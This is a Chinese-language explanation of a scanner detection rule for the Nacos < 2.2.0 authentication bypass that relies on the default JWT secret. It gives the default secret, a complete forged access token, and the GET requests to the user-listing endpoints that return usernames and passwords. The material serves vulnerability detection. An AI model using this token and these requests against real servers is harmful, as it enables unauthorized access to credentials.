# Nacos < 2.2.0 - 认证绕过漏洞（默认JWT密钥）探测原理说明

## 1. 漏洞简介

Nacos 2.2.0 之前版本存在认证绕过漏洞。由于默认JWT密钥未更改，攻击者可伪造合法Token，绕过认证获取敏感信息。

## 2. 影响范围

- 受影响产品：Nacos < 2.2.0（未修改默认JWT密钥的实例）
- 只要JWT密钥未更改，均可能被利用

## 3. 漏洞原理

Nacos使用JWT进行用户认证。若管理员未更改默认密钥，攻击者可利用公开的默认密钥生成任意合法Token，直接访问受保护接口，绕过认证。

## 4. 利用方式与攻击流程

1. 攻击者使用默认密钥`nacos`生成合法JWT Token。
2. 构造带有该Token的HTTP请求，访问Nacos认证接口。
3. 服务端用默认密钥校验Token，认证通过，返回敏感信息。

## 5. 探测原理与流程（yaml 规则详细说明）

该yaml规则利用默认JWT Token进行无害化探测，流程如下：

### 5.1 探测请求的构造

- 发送GET请求到如下接口：
  ```
  GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=<默认token>
  GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=<默认token>
  ```
  - `<默认token>`为已知的默认JWT Token：
    `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应体需包含`"username":`和`"password":`字段，表明返回了用户信息。
  - 响应头需包含`application/json`。
  - HTTP状态码为200。

### 5.3 判定逻辑

- 只有当：
  1. 响应体中包含`"username":`和`"password":`，
  2. 响应头包含`application/json`，
  3. 状态码为200，
  才判定目标存在认证绕过漏洞。

- **判定流程伪代码**：
  ```pseudo
  token = 默认JWT Token
  for path in ["/nacos/v1/auth/users", "/v1/auth/users"]:
      发送GET {path}?pageNo=1&pageSize=10&accessToken={token}
      若响应体含username和password，响应头含application/json，状态码为200：
          判定目标存在认证绕过漏洞
  ```

- **流程图**：
  ```mermaid
  graph TD
      A[发送带默认token的GET请求到认证接口] --> B{响应体含username和password?}
      B -- 否 --> F[无漏洞或未触发]
      B -- 是 --> C{响应头含application/json?}
      C -- 否 --> F
      C -- 是 --> D{状态码为200?}
      D -- 否 --> F
      D -- 是 --> E[判定目标存在认证绕过漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [Nacos官方issue](https://github.com/alibaba/nacos/issues/10060)
- [阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2023-1655789)
- [Nacos官方认证文档](https://nacos.io/zh-cn/docs/auth.html) 